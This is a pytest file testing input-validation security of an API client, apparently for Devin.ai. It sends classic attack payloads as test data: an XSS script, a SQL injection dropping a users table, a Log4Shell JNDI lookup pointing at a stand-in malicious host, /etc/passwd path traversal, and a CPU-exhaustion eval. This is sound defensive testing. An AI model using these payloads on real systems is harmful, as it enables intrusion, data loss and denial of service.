"""Tests for input validation security in Devin.ai."""
import pytest
from src.utils.api_client import DevinClient

@pytest.fixture
def api_client():
    """Create API client fixture."""
    return DevinClient(
        base_url=pytest.config.getoption("--api-url"),
        api_key=pytest.config.getoption("--api-key")
    )

class TestInputValidation:
    """Test cases for input validation security."""
    
    @pytest.mark.parametrize("payload", [
        {"query": "<script>alert('XSS')</script>"},
        {"query": "'; DROP TABLE users; --"},
        {"query": "${jndi:ldap://malicious-server.com/exploit}"},
        {"query": "../../etc/passwd"},
        {"query": "eval(compile('for i in range(10**9): pass', 'string', 'exec'))"},
    ])
    def test_malicious_input_handling(self, api_client, payload):
        """Test handling of potentially malicious inputs."""
        result = api_client.send_query(**payload)
        
        assert result["status_code"] not in (500, 501, 502, 503), \
            "Server error indicates potential vulnerability"
        
        if "data" in result:
            response_text = str(result["data"]).lower()
            for keyword in ["exception", "error:", "stacktrace", "traceback", "syntax error"]:
                assert keyword not in response_text, \
                    f"Response contains error information: {keyword}"
    
    def test_large_input(self, api_client):
        """Test handling of extremely large inputs."""
        large_query = "a" * (10 * 1024 * 1024)  # 10MB string
        result = api_client.send_query(query=large_query)
        
        assert result["status_code"] in (200, 413), \
            f"Unexpected status code for large input: {result['status_code']}"
